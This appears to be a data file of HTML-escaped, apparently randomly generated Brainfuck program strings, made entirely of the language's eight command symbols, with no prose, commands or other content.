&quot;-&gt;&lt;&lt;&gt;-+-&gt;&lt;+-&lt;&gt;&lt;&gt;-+-&lt;&gt;+-+-&gt;&lt;+--&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;--++-+-&gt;&lt;]&lt;&gt;&lt;+-&lt;&gt;+-&gt;&lt;-&lt;&gt;-+[&gt;&lt;+-&gt;&lt;+-&lt;&gt;&lt;&lt;&gt;&lt;&gt;+&gt;&lt;&lt;&gt;&gt;&gt;&lt;-+&lt;&gt;&lt;&gt;[&gt;&lt;&quot; &quot;-+-&lt;&gt;]]&gt;&lt;&lt;&gt;,&lt;&gt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;++&gt;&lt;&gt;&lt;&lt;&gt;-++-+&gt;&lt;-++-&lt;&gt;+&lt;&gt;+&gt;&lt;-+-+&gt;&lt;[&lt;&gt;&lt;&lt;&gt;&lt;&gt;&lt;&gt;-+&gt;&lt;--+-+-+&gt;&lt;-&lt;&gt;&gt;&lt;+--+--+--&gt;&lt;+-&gt;&lt;&lt;&gt;&lt;&quot; &quot;&gt;--+-+--&lt;&gt;+--&gt;&lt;&gt;&lt;+-+--+&gt;&gt;&lt;-+-+-&gt;&lt;&lt;&gt;&gt;&lt;][&lt;+[,-&gt;[&gt;&gt;..&gt;[.---&gt;[.-,[[&gt;[,[&lt;+[&gt;,&lt;+-]&gt;-[.&lt;&gt;]][&lt;+&lt;,--]&lt;+].,&gt;][&quot; &quot;&lt;,+,.[+&gt;-[,.-[.&lt;,&gt;]]],]][.&gt;+-,,+&lt;,]&lt;].+&lt;]],-&gt;].]&lt;-+-+---+&lt;&gt;-+-[&gt;&lt;-+-+&lt;&gt;&lt;&gt;&lt;-+-+-+-++&lt;&gt;&lt;&gt;-+&gt;&gt;&lt;[&lt;&gt;-+&gt;&lt;-&quot; &quot;][+&gt;-+-&lt;+]&lt;&gt;&gt;&lt;+-+--+]&lt;&gt;-+,+--+-+&lt;&gt;&gt;+-+-++&gt;&lt;+-&lt;&gt;++-&lt;&gt;+&lt;&gt;+-&gt;&lt;+&gt;&lt;&gt;&lt;+[&lt;+--+--+-+&lt;&gt;&gt;&lt;-&gt;&lt;-+&gt;&lt;-+-+-&gt;&lt;&gt;&lt;&gt;&lt;-&gt;&quot; &quot;&lt;&lt;&gt;&lt;&gt;-+--++--+--++-&lt;&gt;+--&lt;&gt;&gt;&lt;+-&lt;&gt;+--+-+--+-&lt;&gt;-+-&gt;&lt;&gt;&lt;+--&gt;&lt;&lt;&gt;-+&gt;&lt;--+--+-+-&lt;&gt;-+-&gt;&lt;&gt;&lt;-+-+--+-+&lt;&gt;-+&gt;-+&gt;&lt;-+&quot; &quot;&lt;&gt;-&lt;&gt;][&lt;+[[,+[..&lt;].,-]--,[[&lt;,-[+&lt;+[-+&lt;[.&gt;,[.-&lt;[[-,&lt;.+],.,[.-&lt;,&gt;-]]&gt;&lt;&gt;&gt;-]-+]+-,&gt;-&lt;][-[.,&lt;]&gt;.],&lt;]]&gt;-.[&quot; &quot;&gt;&gt;.[.[&lt;.+[[-&gt;&gt;[[,-]+&lt;]&gt;+[&gt;,-[,,]-&gt;,]]]-,]+-,]]].]&lt;,.]&gt;&lt;&gt;&lt;&lt;&lt;&gt;+--+--+-+-[+--+&lt;&gt;&lt;&gt;-+&lt;+-+&gt;&lt;&gt;[--++-][.&gt;+[&quot; &quot;&gt;[.+,[&gt;&lt;[-&lt;.,&lt;[+,-.]]].,-]&gt;[-&lt;&gt;-&gt;&gt;&gt;]].,+[&lt;-[,-,[&lt;.[.--[.+[[&lt;[+&gt;+[&lt;.--&gt;,-]++.+&lt;,][&lt;,[.,,&gt;]]]-]&lt;,[-&lt;-[&quot; &quot;[-+[,-+.]-[+-.&gt;&gt;,&lt;&lt;]-][&gt;&gt;&gt;+[..&gt;]-]-&lt;][[--&gt;[.,&lt;&gt;-]+][&lt;[&lt;.+.,]+&gt;.+++]..-]],,]&gt;,&gt;[++[-&lt;,-[..[+[&gt;&gt;&gt;+]-&lt;.&quot; &quot;[&lt;,-&gt;]&lt;-],,]+-]+,],-]&lt;]-&gt;,]&gt;&gt;].]-+&lt;&gt;][&lt;&lt;-+]&lt;&gt;+-+-&lt;&gt;-+,&gt;&lt;&gt;+--+&gt;&lt;&gt;&lt;&lt;&gt;+&lt;&gt;&lt;&gt;-+&lt;&gt;-++&lt;&gt;&lt;&gt;&gt;&lt;-++&gt;&lt;+&gt;&lt;&gt;&lt;+&gt;&lt;-+&quot; &quot;&lt;&gt;+&gt;&lt;&lt;&gt;&gt;&lt;[&gt;&lt;&gt;&lt;&lt;&gt;&lt;-&lt;&gt;-+&lt;&gt;&lt;&gt;-&gt;&lt;&gt;&lt;&gt;&lt;+--&lt;&gt;-++-&lt;&gt;&lt;&gt;--&lt;&gt;&lt;&gt;&gt;&lt;&gt;&lt;&lt;&gt;--+&lt;&gt;-+&gt;&lt;-&gt;&lt;+--&lt;&gt;-++-+-&gt;&lt;&gt;&lt;&gt;&gt;&lt;+-+--]+-+-+-&quot; &quot;&lt;+-&lt;&gt;&gt;&lt;&lt;&gt;-+[+--+&gt;&lt;&lt;&gt;&lt;+-&gt;&lt;+&lt;&gt;&gt;&lt;&gt;+-[&gt;&lt;&lt;&gt;-++--+-][[&lt;,&gt;[-[+++[[[+.].+,[.&gt;+[-..[-[&gt;&lt;&lt;&lt;]]&lt;,[+[&lt;&lt;&lt;,--&lt;]&gt;,&gt;.&quot; &quot;]].&gt;&lt;]]&lt;[.&gt;+[&gt;[[&gt;.,[+&gt;.+&gt;.]&lt;+]+,]]+&lt;]..+].[[&lt;&lt;,.[--&gt;[-,[&gt;[.+&lt;]&gt;[+&lt;&gt;]&gt;.&lt;]&lt;&lt;,.][.+&lt;&gt;]&gt;,&lt;],-,],&gt;&lt;]&lt;&gt;].&lt;&quot; &quot;-+.].+]&lt;&lt;&gt;]][&lt;&gt;+&lt;&lt;[-&gt;[+&gt;[-&lt;.&lt;[+,+[[,+&gt;&gt;,&lt;-]]&lt;]-.].+&gt;&lt;],.+]&lt;.],-+-+&gt;&lt;&gt;&lt;&gt;+&lt;&gt;&gt;&lt;&lt;&gt;++-&gt;&lt;+-&gt;&lt;++--++&lt;&gt;&gt;&lt;&lt;&gt;+&quot; &quot;-+&lt;&gt;&lt;&gt;+-+-++&gt;&lt;++&gt;&lt;-+&gt;&lt;-+[&gt;&lt;&lt;-++--+-+--+-+--+&gt;&lt;&gt;&lt;-&gt;&lt;&gt;&lt;&lt;&gt;-+--&gt;&lt;&gt;&lt;&gt;&lt;-+-+--+&lt;&gt;&lt;&gt;&lt;&gt;-+&gt;&gt;&lt;-+&lt;&gt;&gt;&lt;&lt;&gt;--++-&gt;&lt;&gt;&lt;&quot; &quot;][,&lt;[,&lt;[..[+&gt;,][,[,,[-.[.+[[.&lt;],..[,[+,,]]&gt;&gt;][&gt;,[,&gt;[+,.+]&lt;-.&gt;]&gt;&lt;&gt;[-,,[&lt;-+-]&lt;[&lt;+&gt;,.-,-]&lt;&lt;]-,]].&gt;&gt;&gt;]-&gt;&quot; &quot;++]++&gt;&lt;&lt;]+,,][&gt;&lt;+.-&gt;]--+][..,]&gt;&gt;-]&gt;&lt;+--+&lt;&gt;&lt;+---[-++-&gt;&lt;-+&lt;&gt;&lt;&lt;&gt;&gt;&lt;-+-++&lt;&gt;-+&gt;&lt;&lt;&gt;&gt;-++-&lt;&gt;&gt;&lt;[-]+-&gt;&lt;+-]-+-+&gt;&quot; &quot;&lt;+-,-+&gt;&lt;-+&gt;&lt;&gt;&lt;&gt;+-+&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;+&lt;&gt;&lt;&gt;&gt;&lt;+&gt;&lt;&gt;&lt;&gt;&lt;+-+&gt;&lt;&lt;&gt;+&gt;&lt;++-&lt;&gt;++-+--++++-++-&lt;&gt;&gt;&lt;[&lt;&gt;+--+&lt;-+--+-&gt;&lt;+---+-+-++-&quot; &quot;+--&lt;&gt;-+&lt;&gt;&lt;&gt;-&lt;&gt;+-&gt;+--][.[[&lt;&gt;.++&gt;[&gt;.[++.&gt;][,&lt;-+[.[[&lt;&lt;&gt;[+&gt;&gt;+[.&gt;&lt;&lt;.-]&lt;&gt;&gt;][+-+--].]-&lt;&lt;],&gt;.&gt;]+].]&gt;].&lt;+]+&gt;[&quot; &quot;.---&lt;+.]]&gt;&lt;-++-&lt;&gt;&lt;&gt;&lt;-&lt;&gt;-+-+&lt;&gt;-+[-+-++-+-&lt;&gt;&lt;+&lt;&gt;-+&lt;&gt;&gt;&gt;&lt;-+[&lt;&gt;-][,[&lt;.&lt;.-&lt;]+.&lt;[&lt;+[&lt;&gt;,--][&gt;,[--+-,&gt;.]-+&lt;&lt;&gt;&quot; &quot;]-.-]+.]+--+],&gt;&lt;&gt;&lt;-++-&gt;+&lt;&gt;+-+-+&gt;&lt;+-&lt;&gt;+-+&gt;&lt;&lt;&gt;&lt;&gt;+-+-++&lt;&gt;+--++-&lt;&gt;+-+&lt;&gt;&lt;&gt;+-+-++-&lt;&gt;&lt;&gt;-+[&lt;-+--&gt;&lt;&gt;&lt;+-----&gt;&lt;&quot; &quot;&lt;&gt;+--&gt;-&gt;&lt;&gt;&lt;+-+-&gt;&lt;]-++-&lt;&gt;&lt;-+&gt;&lt;-+[+-&lt;&gt;&gt;&lt;+-&lt;&lt;&gt;&gt;&lt;&lt;&gt;+&lt;&gt;-+&lt;&gt;-+-+&gt;[-+-][+&gt;-[&gt;&gt;&lt;[[+&gt;,.+].&lt;]]-[,-&gt;&lt;]&lt;,.]&lt;&gt;&gt;&lt;-&quot; &quot;+]+-,&gt;&lt;&lt;&gt;&lt;&gt;+--+&gt;&gt;&lt;&lt;&gt;&lt;&gt;+&lt;&gt;&lt;&gt;+-+-+&lt;&gt;&gt;&lt;-++&gt;&lt;&lt;&gt;+&gt;&lt;+-++&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;++--+&gt;&lt;++--+&gt;&lt;-++-+&lt;&gt;&lt;&gt;++-+-&lt;&gt;-+&gt;&lt;[&gt;&lt;&gt;&lt;+&quot; &quot;-&lt;--&gt;&lt;+-+---+-+-+-+-+-&lt;&gt;-+&gt;&lt;-&lt;&gt;&gt;&lt;-+-+-+-&gt;&lt;-&lt;&gt;-+--+--+&gt;-+&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;--+-+-+][[-&lt;-[++-[&lt;.[.&gt;,.&gt;+-]&gt;,&lt;-]-&gt;&quot; &quot;-]&gt;+,]-[&lt;.&gt;.&lt;]]&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;+-&gt;&lt;-+-+-&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;-&gt;&lt;--&gt;&lt;-+&gt;&lt;&gt;&lt;+--&gt;&lt;-+&gt;&lt;&lt;&gt;+--&lt;&gt;&gt;&lt;--+[+-&lt;&gt;&lt;+&lt;&gt;-+&gt;[&gt;&lt;-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;]&quot; &quot;[&gt;&lt;+[-,&lt;&lt;&gt;+],-]&lt;&gt;]+-&lt;&gt;-+,+--+&lt;&gt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;+--+&gt;&lt;+-+-+++&lt;&gt;&gt;&lt;++--++-+-+&lt;&gt;+-&gt;&lt;+[&lt;&gt;&lt;--++-&lt;&gt;-&gt;&lt;-+-&lt;&gt;&gt;&lt;+-+--+-&quot; &quot;&gt;&lt;-&lt;&gt;&lt;&gt;-&lt;&gt;-+&gt;&lt;-+-+-&gt;&lt;&gt;&lt;-+-&lt;&gt;+-+-&lt;&gt;&lt;&gt;&gt;-+-+&gt;&lt;&gt;&lt;--+&lt;&gt;-+-+][.-[-[-&gt;.-+&gt;+,]+-[-&lt;&gt;]-,,]&lt;&lt;&gt;]&gt;&lt;-+-+&lt;-&lt;&gt;&lt;&gt;-++&quot; &quot;-&gt;&lt;--[&gt;&lt;&lt;&gt;-+&lt;&lt;&gt;+-&lt;&gt;&lt;&gt;+&gt;&lt;&lt;&gt;+-&gt;&lt;&gt;&lt;&gt;-+[-&lt;&gt;]]&lt;&gt;&gt;&lt;,&gt;&lt;+-+-&gt;&gt;&lt;&lt;&gt;&gt;&lt;-++-++-++-+&lt;&gt;&gt;&lt;++-&gt;&lt;+&gt;&lt;&gt;&lt;+--++[-+&lt;&gt;+--++-&quot; &quot;&lt;&lt;&gt;-++----+&gt;&lt;+--&gt;&lt;&gt;&lt;+--+-&lt;&gt;-++--+--++-&lt;&gt;-+-&lt;&gt;-&gt;&lt;&lt;&gt;+-&gt;&lt;+--&gt;&lt;&gt;&lt;&gt;-+&lt;&gt;-][..&lt;&gt;&lt;-]-+&lt;-+-+--&gt;&lt;&lt;&gt;+-[+-+-&gt;&lt;&lt;&gt;&quot; &quot;+-&lt;-++-+-++-&gt;&lt;&gt;&lt;&gt;[+-&gt;&lt;--+&gt;&lt;][&gt;[-&lt;&gt;-][.&gt;-,--]-]&lt;&gt;+-]-++-&lt;&gt;&gt;&lt;&lt;&gt;,+-&gt;-++&lt;&gt;++-&lt;&gt;&gt;&lt;+-+&lt;&gt;+&gt;&lt;+-+&lt;&gt;+-&lt;&gt;+++-+&gt;&quot; &quot;&lt;[&lt;&gt;&lt;&gt;-+&gt;&lt;&gt;&lt;&lt;+--&lt;&gt;&gt;&lt;&lt;&gt;+---&lt;&gt;+---+--+&gt;&lt;--+&gt;&lt;-&gt;&lt;+-&gt;-++-&lt;&gt;-+&lt;&gt;-&lt;&gt;-++-&gt;&lt;&lt;&gt;][.,-[,,,--[-&lt;].,&lt;]&lt;[,+.]+-.]-&quot; &quot;+&lt;&gt;&lt;&lt;&gt;-&lt;&gt;&gt;&lt;[+--+-+&gt;&lt;+-&lt;&gt;&lt;&gt;&lt;&lt;&gt;-+-+++-&gt;&lt;&gt;&lt;&gt;&gt;&lt;&lt;&gt;-+&gt;&lt;[+-+-+-&lt;&gt;-&lt;&gt;&gt;&lt;&gt;&lt;&lt;&gt;+-][&lt;-&lt;[&gt;&gt;].]-+&lt;&gt;+-]&lt;&gt;&lt;&gt;-+&lt;&gt;,&gt;&gt;&lt;+&quot; &quot;-+&gt;&lt;-++--++-+&lt;&gt;+-++-+--+&lt;&gt;++-+&gt;&lt;+-&lt;&gt;+&gt;&lt;++-&lt;&gt;+-+-&lt;&gt;+&lt;&gt;+--+&lt;&gt;&lt;&gt;[&gt;&lt;+--+-+&lt;-+&lt;&gt;&gt;&lt;-&gt;&lt;&gt;&lt;&lt;&gt;&gt;&lt;-+-+--+-+&lt;&gt;-&gt;&lt;&quot; &quot;+--+-+-+-+-&lt;&gt;-&lt;&gt;-+&gt;&lt;-&gt;&lt;-&lt;&gt;-+&gt;&lt;-&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;--+-+-&lt;&gt;-+-+---+&gt;-+-++--+-&gt;&lt;-+][,[&gt;+[+,.&lt;--&lt;]&gt;[-[&lt;&lt;&gt;[-,[+.[[[&quot; &quot;.[,],[-&lt;,&gt;-]+-].-.]&lt;-[,+&gt;[.[+.+]]&gt;&lt;,]&lt;,].,+[-&gt;,]--,],[&lt;&lt;.&gt;&lt;&lt;]&gt;.-],][+.,&gt;-],&gt;]]++]&lt;&gt;&lt;--&gt;&lt;--++-&lt;&gt;[&gt;&lt;&gt;&lt;&quot; &quot;&lt;&gt;&lt;-+&gt;&lt;&lt;&gt;+-&gt;&lt;++-+-&gt;&lt;&gt;-+-++-&gt;&lt;[&lt;&gt;&lt;&gt;-+&lt;&gt;+--&lt;&gt;][.[,[[.&lt;[[+&gt;&lt;&lt;&gt;+]+.-],++,.]++].,,].[.[&lt;+-[&gt;,&gt;-++]&lt;+]&lt;]]&lt;&quot; &quot;&gt;][[&lt;....[,&lt;.[.[[.[+&gt;++[&lt;.[+-&lt;.,--]&gt;],]&gt;+&gt;-&gt;]-+[-&lt;[[+[[&gt;&gt;+-,.&lt;]&lt;]+-]+[+.[++[],&gt;],.-]+.].&lt;],]-&lt;[+[&gt;&gt;]&quot; &quot;&gt;&gt;[+&gt;[++-+&gt;]&lt;+]..]&lt;.]&lt;[&lt;[.+[.-[-[,+-,&gt;+]&lt;&gt;]].--],++].]&lt;]&gt;-[+,+&gt;.],--]&lt;&gt;,-+-+&gt;&lt;&gt;&lt;&gt;&gt;&lt;-++&lt;&gt;&lt;&gt;&lt;&gt;-+&lt;&gt;+-+-&quot; &quot;++-+-++++-&lt;&gt;+--++-++&gt;&lt;&lt;&gt;&gt;&lt;-++&lt;&gt;+-[&gt;&lt;&lt;&gt;&gt;&lt;-+-+&lt;&lt;&gt;-+--+--+-+-&lt;&gt;&gt;&lt;&lt;&gt;--+-++--&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;-+-&gt;&lt;--+&gt;&lt;+--&lt;&gt;-+&lt;&gt;+&quot; &quot;--&lt;&gt;-+-+--&gt;&lt;-++--+-&gt;&lt;+-&gt;--+]-++-&lt;--+&gt;&lt;&lt;&gt;--&gt;&lt;&gt;&lt;+-&gt;&lt;+--&lt;&gt;-+-&lt;&gt;+-+---+&lt;&gt;[&lt;-+&lt;&gt;+&gt;+-&gt;&lt;&lt;&gt;[--+&gt;&lt;&lt;&gt;-+]&lt;&gt;-++-&quot; &quot;]&gt;&lt;&lt;&gt;&lt;&gt;&gt;&lt;,-+-++--++-&gt;&gt;&lt;-+-++-&lt;&gt;+-+-+-+&gt;&lt;-+++-+&gt;&lt;&lt;&gt;++--+&gt;&lt;+&gt;&lt;&lt;&gt;&gt;&lt;+-&lt;&gt;+&gt;&lt;-++-+[&lt;+-+--++-&lt;&gt;-+-&lt;&gt;&lt;&gt;--+&gt;&lt;&quot; &quot;--+&gt;&lt;+-+-+---+-+&lt;&gt;-+&lt;&gt;-&gt;&lt;-+&lt;&gt;-+-+-&gt;&lt;&gt;&lt;+---+&lt;&gt;-+-&gt;-++---++-+-&gt;&lt;&lt;&gt;]&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;&lt;&lt;&gt;-+&lt;&gt;-+[-+-+&lt;&gt;+-&lt;&gt;&lt;&lt;&gt;&gt;&lt;-+&quot; &quot;+--++&lt;&gt;&gt;&lt;-+&gt;&lt;&gt;+-&gt;&lt;+-&lt;&gt;[-+-+&lt;&gt;--+&gt;&lt;+-+-&gt;&lt;][&gt;,[-&gt;[+&lt;[[,&lt;[-.&gt;]]]&gt;-]-[-,&gt;&gt;[[&gt;-[,[.,&lt;-&lt;]-+]+[&lt;,[&lt;+[-&lt;]]+]&quot; &quot;+],..[+[.+&lt;[+[+--[&gt;&gt;&lt;-,-+.],.[.++]&lt;]&gt;,&lt;&lt;]-]&gt;--&lt;,]-]&gt;.]]]+-&gt;&lt;&lt;&gt;][&lt;[[.[-,,[.,&gt;[.,-&lt;&gt;-]&gt;]+.&gt;],+[+&gt;&lt;&gt;]],&quot; &quot;&lt;+]&gt;]+-&gt;&lt;&gt;&lt;,&gt;&lt;&gt;&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;+-+&lt;&gt;&lt;&gt;&gt;&lt;+-++&gt;&lt;+&lt;&gt;+-&lt;&gt;+&lt;&gt;-+-+&lt;&gt;+&gt;&lt;&lt;&gt;+&lt;&gt;-+-++-[&lt;&lt;&gt;-&lt;&gt;+--+&gt;&lt;+--&gt;&lt;&lt;&gt;-+-&lt;&gt;&gt;&lt;&lt;&gt;-+-&quot; &quot;-+-+-&gt;&lt;+-+-&lt;&gt;-&lt;&gt;-+-++--+-&gt;&lt;-+&gt;-+-+-+-&lt;&gt;+-+-][,&gt;--+,,+&lt;]&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;-+&lt;-+&lt;&gt;&lt;&gt;-&gt;&lt;+--+-+-+----&lt;&gt;[&lt;&lt;&gt;-+&gt;&lt;++-&quot; &quot;&gt;&gt;&lt;-+-+[&lt;&gt;&gt;&lt;&lt;&gt;-+-][+,[-&gt;-,&gt;--..][,+[&lt;[[-+]&lt;+&lt;[,[[.,,,[,[&lt;[&gt;&lt;-&lt;+]&lt;].]][..--]+]+]],[&lt;-&gt;[&lt;&lt;&lt;&gt;.&gt;],,-&lt;+,]&quot; &quot;-&lt;-]&gt;+[[+.][+[&lt;[&lt;[-+--,&lt;,][,.-&gt;&gt;]]]&lt;,-]]&lt;&gt;+]+&gt;&gt;]&lt;&gt;&lt;&gt;&gt;&lt;+-&gt;&lt;]&lt;&gt;&lt;&gt;,&lt;&gt;-+&lt;&gt;&gt;&lt;&gt;-+-+-+-++-+&gt;&lt;-+&gt;&lt;+&lt;&gt;+-+-&gt;&lt;-&quot; &quot;++&gt;&lt;&lt;&gt;+-&lt;&gt;-++-+&lt;&gt;&lt;&gt;++-&gt;&lt;&lt;&gt;&lt;&gt;&gt;&lt;+-++-&lt;&gt;-++&gt;&lt;&lt;&gt;+-+-&gt;&lt;[-++-+-&gt;&lt;&lt;&lt;&gt;+-&lt;&gt;-+&gt;&lt;--+&lt;&gt;&lt;&gt;&gt;&lt;-+-&lt;&gt;-++--&gt;&lt;&lt;&gt;-+-&gt;&lt;-+&quot; &quot;+-&lt;&gt;-+--+--&gt;&lt;&gt;&lt;+--+&gt;&lt;--+&gt;&lt;&lt;&gt;&lt;&gt;+---&gt;&lt;+--&lt;&gt;&lt;&gt;&gt;&lt;-&gt;&lt;+-&gt;&lt;-+-&lt;&gt;-&gt;&lt;+-&gt;&lt;-++-&gt;&lt;&gt;-+-&lt;&gt;&lt;&gt;+-]+-&gt;&lt;&gt;&lt;&gt;&lt;&lt;&gt;&lt;-+&lt;&gt;+--+&quot; &quot;[&lt;-+&lt;&gt;&gt;&lt;-++-+-++-&gt;&gt;&lt;[&lt;&gt;-+&lt;&gt;&lt;&gt;-&lt;&gt;+-&lt;&gt;&lt;&gt;]&gt;&lt;+-&gt;&lt;&gt;&lt;&gt;&lt;][-+&gt;+]&gt;&lt;&gt;&lt;&gt;&lt;,+-&gt;++&lt;&gt;-+&gt;&lt;++&lt;&gt;-+-++-&lt;&gt;+&gt;&lt;-+-++-+&gt;&lt;++&quot; &quot;-&gt;&lt;+-+&gt;&lt;&lt;&gt;+&gt;&lt;-+&lt;&gt;+-+&gt;&lt;+-[&gt;&lt;&lt;&gt;&lt;-+-&lt;&gt;&gt;&lt;+--+---+--+&gt;&lt;&lt;&gt;-+-+-&gt;+-&lt;&gt;-+&lt;&gt;-&lt;&gt;&gt;&lt;+-&lt;&gt;+-]&lt;&gt;&lt;&gt;-+&gt;&lt;-+&lt;&gt;&lt;-++--&lt;&gt;-+&quot; &quot;&gt;&lt;[&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;&lt;&lt;&gt;-++-&gt;&lt;++-&lt;&gt;&lt;&gt;&gt;&lt;+-&gt;-+&gt;&lt;&gt;&lt;&lt;&gt;&lt;&gt;[-&lt;&gt;][[+-[&lt;[&lt;[.[+.,.[-[&lt;[,-&lt;[&lt;&lt;.]&lt;+.&lt;]&lt;]+-[&gt;+,,]&gt;&gt;,]][&lt;-+&lt;&quot; &quot;,&lt;+]-]-,&gt;[..,&gt;&gt;]].,]&gt;][&lt;&lt;&lt;[.&gt;+[[-&lt;[&gt;[&gt;&lt;.[[++&lt;[.&gt;,&lt;,]]-..[[-&gt;&gt;].,,.&gt;].+]+][,,&gt;,-&lt;-]&lt;..]&gt;]-,.&gt;+].&gt;&gt;]]+&quot; &quot;]-+]&lt;&gt;+-&gt;&lt;,&gt;&lt;&gt;+&lt;&gt;-+&lt;&gt;+-&gt;&lt;+-+&lt;&gt;&gt;&lt;&gt;&lt;+&lt;&gt;&lt;&gt;&gt;&lt;-+&lt;&gt;+&lt;&gt;++-&lt;&gt;-++-++-+-+-+-++&gt;&lt;+&lt;&gt;+&gt;&lt;[&lt;&gt;+--+&lt;&gt;&lt;-&lt;&gt;&gt;&lt;-+-+-&gt;&lt;-+&quot; &quot;&gt;&lt;&gt;&lt;-+-&gt;&lt;&gt;&lt;-+&lt;&gt;-&gt;&lt;+--&gt;&lt;&gt;&lt;&gt;&lt;&gt;-++--+-][&gt;..&gt;,&lt;&gt;]+-&lt;&gt;&lt;-+-+-&lt;&gt;&lt;&gt;&lt;&gt;+---+-&gt;&lt;+-&gt;&lt;--+-&lt;&gt;-++-&gt;&lt;[-+&gt;&lt;+-&lt;++-&gt;-+&gt;&quot; &quot;&lt;[+-&gt;&lt;-+--+&gt;&lt;+-&gt;&lt;&gt;&lt;][,--[-[-[.,-]&lt;--],]]][-[&gt;.[[&gt;&lt;++,,+&lt;]+.&lt;],&gt;.]&gt;--]+-&gt;&lt;-+-+,&gt;&lt;&lt;&gt;&gt;&lt;&gt;&lt;&gt;&gt;&lt;&lt;&gt;-++&lt;&gt;&lt;&gt;+-&quot; &quot;+&lt;&gt;&gt;&lt;-+-++&gt;&lt;&lt;&gt;+-+-+-++-++-+&lt;&gt;++-++--++-++-&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;+-+[&gt;&lt;+-+-+-&gt;&lt;&lt;+-&gt;&lt;&gt;&lt;&gt;&lt;---&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;--+-&lt;&gt;+--+-+-+--&quot; &quot;-+&gt;&lt;-+--+--+-&gt;&lt;&gt;&lt;&gt;-&lt;&gt;&gt;&lt;-++-&gt;&lt;][&lt;&gt;[&lt;&gt;+[.[,++.]&gt;]]-,-]+-&lt;&gt;&lt;&gt;&lt;-+-[&lt;-+&lt;&gt;-+&gt;&lt;+&gt;&lt;+-+--+&gt;+-&gt;&lt;[-+&lt;&gt;-&lt;&gt;][.[+,&quot; &quot;+-&gt;-[&lt;[&gt;-[-.&lt;,&lt;&gt;&gt;].+,]&gt;]]+&gt;[.&gt;&lt;[.&gt;],.-[,&gt;-[[-&lt;[-&gt;,]-&lt;+]&lt;,&lt;&gt;]&lt;+&lt;]]]&lt;&gt;&gt;&lt;-+&lt;&gt;]&gt;&lt;+-&gt;&lt;,-+&gt;&lt;&lt;&gt;&gt;-+++-+&lt;&gt;-+&gt;&quot; &quot;&lt;+-++--+&gt;&lt;++-+-&lt;&gt;-+&lt;&gt;++&lt;&gt;+-&lt;&gt;+-+&gt;&lt;+-+-&gt;&lt;+&gt;&lt;&lt;&gt;-+-+-++-+&gt;&lt;+-+-++-&lt;&gt;&gt;&lt;[&gt;&lt;+-&lt;&gt;&lt;-+&gt;&lt;+--+-&gt;&lt;-&lt;&gt;-+-&gt;&lt;&lt;&gt;&gt;&lt;&lt;&gt;&quot; &quot;--+-+-&gt;&lt;&gt;&lt;&gt;&gt;&lt;-+-&lt;&gt;][&gt;&gt;[++,-+&gt;&lt;&lt;]-.,]-++-&lt;&gt;&gt;&lt;&lt;&gt;&lt;&gt;&lt;+-&gt;&lt;--+-+-&lt;&gt;-++-+--&lt;&gt;&lt;&gt;&gt;&lt;-+-&lt;&gt;+-&lt;&gt;&lt;&gt;[-+-+-+&gt;&lt;&lt;&lt;&gt;+-+&quot; &quot;+-&gt;+--+&lt;&gt;[&gt;&lt;+-&gt;&lt;&gt;&lt;-+--+&lt;&gt;&lt;&gt;-+]&lt;&gt;][+[+&lt;,+[[+.[+&gt;&lt;[&lt;][&gt;&lt;++[-+[&lt;,[[.&gt;,&gt;-]&gt;&lt;+],&lt;].-+--]..],,-],&lt;+]++&gt;-]&gt;&quot; &quot;,,].&gt;.]&gt;&lt;,&gt;+-+-+-+&gt;&lt;+-+-+-+++&lt;&gt;+&lt;&gt;++-+-&gt;&lt;&lt;&gt;-++&lt;&gt;+-+-+-++-++-&gt;&lt;+-&lt;&gt;[&gt;&lt;-++-&gt;&lt;&lt;&lt;&gt;-+---+---+&gt;&lt;&gt;&lt;+-&gt;&lt;-&gt;&lt;+&quot; &quot;--+--+&lt;&gt;+---+-+&gt;&lt;-+-+--&lt;&gt;&gt;&lt;-+&gt;&lt;--++-&gt;&lt;-&gt;&lt;+-+-+-&gt;-+&gt;&lt;-&gt;&lt;&lt;&gt;]&lt;&gt;&gt;&lt;&gt;&lt;&lt;-++-+-&gt;&lt;+--+--+-+&gt;&lt;-[&gt;&lt;&lt;-++&gt;&lt;&gt;&gt;&lt;&lt;&gt;+&quot; &quot;-&gt;&lt;&gt;&lt;[&gt;&lt;-+--+]+-][+.[--,&gt;-++],]-+&lt;&gt;-++-,-+&lt;&gt;+-&lt;&gt;&gt;&lt;&gt;&lt;&gt;+-&lt;&gt;&gt;&lt;-+++&gt;&lt;&lt;&gt;+-+&lt;&gt;+-&lt;&gt;+-+&gt;&lt;-+&gt;&lt;+-+&lt;&gt;+-++++-[&lt;-&quot; &quot;+-+--++--+--+-+&gt;&lt;--&gt;&lt;+-&gt;&lt;-+--+--+-+&gt;+---+&gt;&lt;+-][,.-[.,+[+-&lt;[,[,+[.&gt;[-&gt;+[[+[-&gt;&lt;],[--+,-]&gt;&lt;-][.+,&lt;[,+.&gt;&quot; &quot;..]]]]+.-,-]&lt;,+-]&lt;&gt;&gt;[+[[,-.-+,].+]&lt;+.]-,&lt;]+&gt;]-[[&lt;[&lt;.,&lt;+,][&lt;-+[-[&lt;&lt;&gt;[&gt;+&lt;&lt;++&lt;]-+],]+-]],,-&gt;-]&lt;&lt;&gt;]&gt;+&lt;]+&quot; 